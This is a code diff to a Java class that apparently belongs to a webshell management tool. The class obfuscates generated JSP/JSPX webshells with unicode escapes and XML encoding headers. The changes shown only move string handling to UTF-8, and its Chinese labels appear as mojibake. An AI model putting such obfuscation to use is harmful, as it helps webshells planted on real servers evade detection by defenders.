@@ -9,6 +9,7 @@ import core.annotation.GenerateProcessor;
 import core.imp.ShellProcessor;
 import java.io.UnsupportedEncodingException;
 import java.lang.reflect.Method;
+import java.nio.charset.StandardCharsets;
 import java.util.Arrays;
 import java.util.LinkedList;
 import java.util.SplittableRandom;
@@ -16,7 +17,7 @@ import util.ByteBuffer;
 import util.functions;
 
 @GenerateProcessor(
-        DisplayName = "JSP/JSPX ³¬¼¶»ìÏý",
+        DisplayName = "JSP/JSPX è¶…çº§æ··æ·†",
         superTemplate = {"jsp", "jspx"}
 )
 public class JspEscapesProcessor implements ShellProcessor {
@@ -125,7 +126,7 @@ public class JspEscapesProcessor implements ShellProcessor {
 
     private byte[] processor(byte[] bytes) {
         String content = new String();
-        String targetStr = new String(bytes);
+        String targetStr = new String(bytes, StandardCharsets.UTF_8);
         if (this.options.isDoubleConfusion) {
             targetStr = this.escapesUnicode(targetStr);
         }
@@ -174,7 +175,7 @@ public class JspEscapesProcessor implements ShellProcessor {
             }
         }
 
-        return content.getBytes();
+        return content.getBytes(StandardCharsets.UTF_8);
     }
 
     public byte[] doProcessor(byte[] shell, String suffix) {
@@ -208,7 +209,7 @@ public class JspEscapesProcessor implements ShellProcessor {
         byteBuffer.replace(globalCodeByteBuffer.getBytes(), globalCodeNewByteBuffer.getBytes());
         ByteBuffer codeNewByteBuffer = new ByteBuffer(this.processor(codeByteBuffer.getBytes()));
         byteBuffer.replace(codeByteBuffer.getBytes(), codeNewByteBuffer.getBytes());
-        if (!this.options.EncodingMethod.equals("¹Ø±Õ")) {
+        if (!this.options.EncodingMethod.equals("å…³é—­")) {
             try {
                 String declaration = "<?xml version=\"1.0\" encoding=\"" + this.options.EncodingMethod + "\" ?>";
                 if (!this.options.isEncodingHeader) {
